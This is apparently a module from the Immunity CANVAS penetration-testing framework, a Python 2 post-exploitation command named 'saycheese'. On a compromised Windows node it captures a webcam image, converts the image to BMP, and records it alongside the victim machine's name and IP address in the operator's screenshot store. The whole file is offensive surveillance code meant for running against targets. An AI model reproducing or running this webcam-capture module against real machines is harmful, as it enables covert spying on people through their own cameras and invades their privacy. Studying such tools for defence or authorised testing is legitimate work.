#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from internal import *

import canvasengine
import time
from libs.bmp import *
import random
from canvaserror import *

NAME                   = "saycheese"
DESCRIPTION            = "Grab a picture from a webcam"
DOCUMENTATION          = {}
DOCUMENTATION["Notes"] = """
For commandline use:
MOSDEF\Win32> runmodule saycheese
"""

VERSION                = "1.0"
PROPERTY               = {}
PROPERTY['TYPE']       = "Commands"
PROPERTY['SITE']       = "Local"
PROPERTY['ARCH']       = [ ["Windows"] ]

from engine.config import canvas_root_directory
from ExploitTypes.localcommand import LocalCommand
import tarfile

def extractTar(tf, destpath):
    """Extracts all members of a tarfile. .extractall() was added in 2.5, we have to support 2.4"""
    if isinstance(tf, tarfile.TarFile):
        if hasattr(tf, "extractall"):
            tf.extractall(destpath)
        else:
            for f in tf.getmembers():
                if f.isdir():
                    print "Mkdiring: %s" % f.name
                    os.mkdir(os.path.join(destpath, f.name), 0700)
                else:
                    print "Extracting %s/%s" % (destpath, f.name)
                    tf.extract(f, destpath)
    else:
        raise TypeError("Please to be passing in a TarFile instance")

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result   = []
        self.name     = NAME
        self.filename = None
        self.vert     = None
        self.hor      = None

    # set progress bar
    def set_progr(self, msg, percent):
        self.setInfo("screengrab - "+msg)
        self.setProgress(percent)
        return

    def run(self):
        rv = 0
        self.host=self.target.interface
        self.setInfo("%s (in progress)"%(NAME))

        screenshotCount = 0
        for node in self.argsDict["passednodes"]:
            type=node.nodetype
            if "win32api" in node.capabilities:
                dirname=self.output(ip=node.get_interesting_interface(), subdir="ScreenShots")
                #I'm assuming this opens the file read-write
                #on windows you need to have writable access
                #Lesson Learned: don't use os.tmpfile() for anything portable.
                #tempoutfile=os.tmpfile()
                tmpfilename="tmp%d.raw"%random.randint(0,50000)
                devlog("bmp", "tmpfilename=%s"%tmpfilename)
                tempoutfile=file(tmpfilename,"wb")
                hor,vert,data=node.shell.webcamshot(fileobj=tempoutfile, progr=self.set_progr)
		if hor == -1:
	                self.log("Failed at getting a picture.")
			return -1

		#for a in range(0, len(data),8):
		#	ret.append( data[a:a+3] )
		#data = "".join(ret)


                tempoutfile.close() #go back to beginning
                tempoutfile=file(tmpfilename,"rb")
                ran=random.randint(1,2000)
                #filename="screengrab-%s.raw"%ran
                #fullfilename=os.path.join(canvas_root_directory,dirname,filename)
                #rgbfile=file(fullfilename, "wrb")
                bmpdata="" #set to null because we write into this file later
                filebmp ="screengrab-%s.bmp"%ran
                devlog("bmp", "filebmp = %s"%filebmp)
                #fullbmp=os.path.join(canvas_root_directory,dirname,filebmp)
                fullbmp=os.path.join(dirname,filebmp)
                fout = file(fullbmp, "wb")
                b = BMP()

                fout.write( b.getBMPfromraw(hor, vert, bmpdata))

                devlog("bmp", "Calling normalize: %s:%s"%(hor,vert))
                normalize_no_change(hor, vert, tempoutfile, fout)
                #normalizergb_file(hor, vert, tempoutfile, fout)
                tempoutfile.close() #close this to flush it
                #os.unlink(tmpfilename) #remove our temporary file
                fout.close()
                #now our rgbfile has the correct data in it
                #and is a BMP

                self.addScreenshot(node, fullbmp, vert, hor)
                screenshotCount+=1
                rv = 1
                msg = "success %d screen(s) shot" % screenshotCount

            else:
                self.log("Node of type %s not supported yet."%type)
                rv = -1
                msg = "unsupported"

        self.setInfo("%s - done (%s)"%(NAME, msg))
        return rv

    def addScreenshot(self, node, filename, height, width):
        """Adds a screenshot to the Gui's screenshot store"""
        self.log("Check \"My Screenshots\" icon to see the screenshot")
        localhost=node.get_known_host("127.0.0.1") #get local host
        localhost.add_knowledge("SayCheese",":".join(["%s"%height,"%s"%width,filename]),100)
        filename = ".".join(filename.split(".")[:-1]) + ".conf"
        fout=file(filename, "wb")

        # TODO: Fix this to use exploits/computername, cause node.shell is not right way
        computername= "hostnamegoeshere"
        try:
            computername= node.shell.getComputerName()
        except AttributeError:
            pass

        host=node.get_interesting_interface()

        fout.write("%d:%d:%s [%s]" % (height, width, computername, host))
        fout.close()

        self.result+=[(width, height, filename)]


if __name__=="__main__":
    print "You can't run this from the commandline, sorry"
